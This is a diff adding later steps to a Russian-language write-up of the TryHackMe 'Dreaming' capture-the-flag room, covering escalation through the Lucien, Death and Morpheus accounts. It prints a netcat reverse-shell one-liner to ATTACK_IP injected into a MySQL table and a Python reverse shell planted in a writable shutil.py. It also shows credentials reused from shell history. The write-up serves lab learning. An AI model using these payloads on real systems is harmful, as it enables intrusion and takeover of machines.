@@ -1,4 +1,4 @@
-https://tryhackme.com/room/dreaming
+>https://tryhackme.com/room/dreaming
 
 ## Первичный анализ
 Переходим по адресу лабораторной машины, там нас встречает стандартное приветствие Apache.
@@ -112,4 +112,128 @@ print(shell)
 
 <p align='center'>
   <img src='screenshots/12.png' width='500'>
+</p>
+
+Заходим в учетную запись Lucien, используя команду по SSH и читаем флаг из `/home/lucien`.
+
+> [!NOTE]
+> Изначально я пыталась работать через `su lucien`, но мало того, что оказалось просто неудобно, так еще и в дальнейшем я не смогла подключиться к MySQL.
+> Поэтому лучше сразу использовать подключение по SSH. Оно стабильнее.
+
+<p align='center'>
+  <img src='screenshots/13.png' width='500'>
+  <br>
+  <em>Флаг Lucien</em>
+</p>
+
+## Второй флаг (Death)
+`sudo -l` выводит список привилегий для текущего пользователя. Используем ее и увидим, что можем запустить `getDreams.py` от имени Lucien. Значит, мы можем попробовать взаимодействовать с базой данных. Нужно только получить пароль.
+<br>
+
+В `.bash-history` сохраняется история выполненных команд, поэтому там можно найти какую-нибудь зацепку. В нашем случае через терминал выполнялся вход в MySQL. Просто повторим команду, найденную в `/home/lucien/.bash-history`.
+
+<p align='center'>
+  <img src='screenshots/14.png' width='500'>
+  <br>
+  <em>Успешный вход в MySQL</em>
+</p>
+
+`use library`– выбираем нужную БД, название которой мы узнали из `getDreams.py`; <br>
+`SELECT * FROM dreams` – смотрим, какие данные уже есть в таблице `dreams`. <br>
+
+Нам нужно добавить полезную нагрузку для получения еще одной обратной оболочки, но уже от имени Death. <br>
+
+`INSER INTO dreams (dreamer, dream) VALUES ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACK_IP 8889 >/tmp/f');` – внедряем полезную нагрузку в новую строку таблицы. <br>
+
+Теперь, когда в следующий раз запустится `getDreams.py`, сработает наша полезная нагрузка и при прослушивании порта 8889 мы получим реверс-шелл. <br>
+
+Выходим из панели управления MySQL, включаем прослушивание через Netcat и запускаем `getDreams.py` от имени Death: <br>
+`sudo -u death python3 /home/death/getDreams.py`
+
+<p align='center'>
+  <img src='screenshots/15.png' width='500'>
+  <br>
+  <em>Внедрение полезной нагрузки в MySQL и поулчение реверс-шелла Death</em>
+</p>
+
+Мы получили управление файловой системой от иени Death и можем прочитать флаг в его директории.
+
+<p align='center'>
+  <img src='screenshots/16.png' width='500'>
+  <br>
+  <em>Флаг Death</em>
+</p>
+
+## Третий флаг (Morpheus)
+
+Так как `getDreams.py` принадлежит пользователю Death, мы теперь сможем увидеть пароль от MySQL, который ранее был скрыт. 
+
+<p align='center'>
+  <img src='screenshots/17.png' width='500'>
+  <br>
+  <em>Пароль MySQL пользователя Death</em>
+</p>
+
+Попробуем подключиться по SSH с этим паролем и выясняем, что он подходит. Отлично, теперь у нас есть более стабильное соединение.
+
+В домашнем каталоге Morpheus находятся файлы `restore.py` и `kingdom`.
+
+<p align='center'>
+  <img src='screenshots/18.png' width='500'>
+  <br>
+  <em><code>/home/morpheus</code></em>
+</p>
+
+`restore.py` копирует содержимое `/home/morpheus/kingdom` в `/kingdom_backup/kingdom` с помощью модуля `shutil`. <br>
+Файл `restore.py` регулярно запускается пользователем Morpheus, поэтому нам нужно использовать его как входную точку. <br>
+
+Найдем, где находится файл этого модуля с помощью `find`.
+
+<p align='center'>
+  <img src='screenshots/19.png' width='500'>
+</p>
+
+Перейдя в `/usr/share/python3.8` можно заметить, что у пользователя Death есть права на редактирование `shutil.py`.
+
+<p align='center'>
+  <img src='screenshots/20.png' width='500'>
+  <br>
+  <em>Права доступа <code>shutil.py</code></em>
+</p>
+
+Воспользуемся этим для получения еще одной обратной оболочки: <br>
+- Импортируем модули `pty` и `socket`;
+  ```
+  import pty
+  import socket
+  ```
+- Заменим содержимое функции `copy2`.
+  ```
+  def copy2(src, dst, *, follow_symlinks=True):
+    lhost = "ATTACK_IP"
+    lport = 8890
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((lhost, lport))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    os.putenv("HISTFILE",'/dev/null')
+    pty.spawn("/bin/bash")
+    s.close()
+  ```
+
+Теперь нужно лишь подождать, пока `restore.py` не запустится "по расписанию" и вот! Мы получили обратную оболочку.
+
+<p align='center'>
+  <img src='screenshots/21.png' width='500'>
+  <br>
+  <em>Обратная оболочка Morpheus</em>
+</p>
+
+Прочитаем флаг из домашней директории:
+
+<p align='center'>
+  <img src='screenshots/22.png' width='500'>
+  <br>
+  <em>Флаг Morpheus</em>
 </p>
